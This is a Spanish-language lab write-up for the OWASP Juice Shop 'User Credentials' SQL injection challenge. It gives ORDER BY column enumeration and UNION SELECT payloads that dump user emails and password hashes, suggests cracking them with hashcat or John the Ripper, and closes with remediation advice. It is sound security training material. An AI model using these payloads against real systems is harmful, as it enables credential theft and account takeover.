# User Credentials

| Campo | Valor |
|-------|-------|
| **Challenge** | User Credentials |
| **Categoría** | Injection |
| **Dificultad** | 4 (Very Hard) |

## Descripción de la Vulnerabilidad

El challenge consiste en extraer una lista completa de credenciales de usuario mediante SQL Injection. A diferencia de otros challenges de login, aquí se debe usar un ataque UNION SELECT para exfiltrar los datos de la tabla de usuarios.

## Técnica / Payload Utilizado

1. Identificar un endpoint que sea vulnerable a SQL Injection con un parámetro filtrable. El endpoint de búsqueda de productos `/rest/products/search` es vulnerable.
2. Primero, determinar el número de columnas de la consulta original usando ORDER BY:
   - `q=' ORDER BY 1--`, incrementar hasta que dé error
3. Una vez conocido el número de columnas, construir un UNION SELECT:

```
q=')) UNION SELECT id, username, password, role, deluser, '1', '1', '1', '1' FROM Users--
```

4. O alternativamente, explotar el endpoint de login con UNION SELECT:

```
' UNION SELECT id, email, password, '1', '1', '1', '1', '1', '1', '1' FROM Users--
```

5. Los resultados contienen los hashes de contraseñas de todos los usuarios
6. Crackear los hashes con herramientas como john the ripper o hashcat

## Evidencia

La consulta UNION SELECT retorna los datos de todos los usuarios, incluyendo emails y hashes de contraseñas. Los resultados son visibles en la respuesta de la API.

## Remediation

- Usar consultas parametrizadas (prepared statements) en todos los endpoints
- Implementar un ORM que prevenga SQL Injection
- No devolver más datos de los necesarios en las respuestas de la API
- Hashear contraseñas con bcrypt o Argon2 (no MD5 ni SHA1)
- Implementar rate limiting y detección de anomalías en consultas

## Lección Aprendida

UNION SELECT es una de las técnicas más poderosas de SQL Injection, permitiendo extraer datos arbitrarios de cualquier tabla. Determinar el número de columnas es el primer paso crítico. La única defensa efectiva son las consultas parametrizadas.

---

> Writeup generado para OWASP JuiceShop — Lab de ciberseguridad TARS